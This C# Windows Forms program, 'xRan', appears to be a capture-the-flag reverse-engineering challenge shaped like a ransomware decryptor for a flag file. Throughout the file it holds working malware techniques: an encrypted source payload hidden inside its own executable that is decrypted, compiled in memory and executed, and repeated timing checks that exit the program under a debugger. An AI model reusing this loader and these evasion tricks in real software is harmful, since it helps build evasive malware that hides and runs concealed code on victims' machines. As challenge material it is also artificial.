using System;
using System.CodeDom.Compiler;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace xRan
{
    public partial class Form1 : Form
    {
        static int tc;
        public Form1()
        {
            tc = Environment.TickCount & Int32.MaxValue;
            startAction();
            if ((Environment.TickCount & Int32.MaxValue - tc) > 2000) { Environment.Exit(1); }
            else { tc = Environment.TickCount & Int32.MaxValue; }
            InitializeComponent();
        }
        public void startAction()
        {
            if ((Environment.TickCount & Int32.MaxValue - tc) > 2000) { Environment.Exit(1); }
            else { tc = Environment.TickCount & Int32.MaxValue; }
            CodeDomProvider provider = CodeDomProvider.CreateProvider("CSharp");
            if ((Environment.TickCount & Int32.MaxValue - tc) > 2000) { Environment.Exit(1); }
            else { tc = Environment.TickCount & Int32.MaxValue; }
            CompilerParameters parameters = new CompilerParameters();
            if ((Environment.TickCount & Int32.MaxValue - tc) > 2000) { Environment.Exit(1); }
            else { tc = Environment.TickCount & Int32.MaxValue; }
            parameters.GenerateExecutable = true;
            if ((Environment.TickCount & Int32.MaxValue - tc) > 2000) { Environment.Exit(1); }
            else { tc = Environment.TickCount & Int32.MaxValue; }
            parameters.GenerateInMemory = true;
            if ((Environment.TickCount & Int32.MaxValue - tc) > 2000) { Environment.Exit(1); }
            else { tc = Environment.TickCount & Int32.MaxValue; }
            parameters.TreatWarningsAsErrors = false;
            parameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
            if ((Environment.TickCount & Int32.MaxValue - tc) > 2000) { Environment.Exit(1); }
            else { tc = Environment.TickCount & Int32.MaxValue; }
            parameters.ReferencedAssemblies.Add("System.dll");
            if ((Environment.TickCount & Int32.MaxValue - tc) > 2000) { Environment.Exit(1); }
            else { tc = Environment.TickCount & Int32.MaxValue; }
            parameters.ReferencedAssemblies.Add("System.Drawing.dll");
            if ((Environment.TickCount & Int32.MaxValue - tc) > 2000) { Environment.Exit(1); }
            else { tc = Environment.TickCount & Int32.MaxValue; }
            parameters.ReferencedAssemblies.Add("System.Linq.dll");
            if ((Environment.TickCount & Int32.MaxValue - tc) > 2000) { Environment.Exit(1); }
            else { tc = Environment.TickCount & Int32.MaxValue; }
            parameters.ReferencedAssemblies.Add("System.Data.dll");
            if ((Environment.TickCount & Int32.MaxValue - tc) > 2000) { Environment.Exit(1); }
            else { tc = Environment.TickCount & Int32.MaxValue; }
            CompilerResults result = provider.CompileAssemblyFromSource(parameters, k());            
            if (result.Errors.Count > 0)
            {
                foreach (CompilerError er in result.Errors)
                    Console.WriteLine(er.ToString());
                return;
            }
            if ((Environment.TickCount & Int32.MaxValue - tc) > 2000) { Environment.Exit(1); }
            else { tc = Environment.TickCount & Int32.MaxValue; }
            Assembly assembly = result.CompiledAssembly;
            MethodInfo methodInfo = assembly.EntryPoint;
            object entryPointInstance = assembly.CreateInstance(methodInfo.Name);
            methodInfo.Invoke(entryPointInstance, null);
        }
                
        private void Button1_Click(object sender, EventArgs e)
        {
            string key = this.textBox1.Text;
            string path = "xRan/flag.txt.xRan";
            tc = Environment.TickCount & Int32.MaxValue;
            if ((Environment.TickCount & Int32.MaxValue - tc) > 2000) { Environment.Exit(1); }
            else { tc = Environment.TickCount & Int32.MaxValue; }
            if (File.Exists(path))
            {                
                i(path, key);
                lblresult.Text = "File Decrypted";
            }
            else
            {
                lblresult.Text = "File Not Found!";
            }
        }
        public void i(string file, string password)
        {
            byte[] bytesToBeDecrypted = File.ReadAllBytes(file);
            if ((Environment.TickCount & Int32.MaxValue - tc) > 2000) { Environment.Exit(1); }
            else { tc = Environment.TickCount & Int32.MaxValue; }
            byte[] bytesDecrypted = h(bytesToBeDecrypted, SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(password)));
            File.WriteAllBytes(file, bytesDecrypted);
            if ((Environment.TickCount & Int32.MaxValue - tc) > 2000) { Environment.Exit(1); }
            else { tc = Environment.TickCount & Int32.MaxValue; }
            string extension = System.IO.Path.GetExtension(file);
            string result = file.Substring(0, file.Length - extension.Length);
            if ((Environment.TickCount & Int32.MaxValue - tc) > 2000) { Environment.Exit(1); }
            else { tc = Environment.TickCount & Int32.MaxValue; }
            System.IO.File.Move(file, result);

        }
        public byte[] h(byte[] bytesToBeDecrypted, byte[] passwordBytes)
        {
            byte[] decryptedBytes = null;
            byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };
            if ((Environment.TickCount & Int32.MaxValue - tc) > 2000){Environment.Exit(1);}
            else{tc = Environment.TickCount & Int32.MaxValue;}
            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;
                    var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);

                    AES.IV = key.GetBytes(AES.BlockSize / 8);
                    AES.Mode = CipherMode.CBC;
                    using (var cs = new CryptoStream(ms, AES.CreateDecryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
                        cs.Close();
                    }
                    decryptedBytes = ms.ToArray();
                }
            }
            return decryptedBytes;
        }
        static String[] k()
        {
            byte[] bytes = File.ReadAllBytes(Assembly.GetEntryAssembly().Location);

            int i = 0;
            string y = "RkBoNZ42gBQwdhiyQ5y0GVIDY7FKEcVb";
            string key = "JXR7svy0LQYAio2pqyxrHQOYHVzXJdiN";
            string pass = "RmSeZBUGeENW9pZDROzlHtbp9VAQ9jmD";


            List<String> sourceFiles = new List<String>();

            for (i = 0; i < bytes.Length - 2; i++)
            {
                if (bytes[i] == bytes[i + 1] && bytes[i + 1] == bytes[i + 2] && bytes[i + 2] == 28)
                {
                    i += 3;
                    break;
                }
            }
            List<Byte> sourceFileBuffer = new List<Byte>(4000);
            for (; i < bytes.Length - 2; i++)
            {
                if (bytes[i] == bytes[i + 1] && bytes[i + 1] == bytes[i + 2] && bytes[i + 2] == 28)
                {
                    sourceFiles.Add(Encoding.Default.GetString(j(sourceFileBuffer.ToArray(), y)));
                    sourceFileBuffer.Clear();
                    i += 2;
                }
                else
                    sourceFileBuffer.Add(bytes[i]);

            }
            return sourceFiles.ToArray();
        }
        public static byte[] j(byte[] text, string key)
        {
            RijndaelManaged aes = new RijndaelManaged();
            aes.KeySize = 256;
            aes.BlockSize = 256;
            aes.Padding = PaddingMode.Zeros;
            aes.Mode = CipherMode.CBC;
            aes.Key = Encoding.Default.GetBytes(key);
            byte[] IV = new byte[32];
            Array.Copy(text, text.Length - 32, IV, 0, 32);
            byte[] text2 = new byte[text.Length - 32];
            Array.Copy(text, text2, text2.Length);
            aes.IV = IV;
            ICryptoTransform AESDecrypt = aes.CreateDecryptor(aes.Key, aes.IV);
            return AESDecrypt.TransformFinalBlock(text2, 0, text2.Length);
        }
    }
}
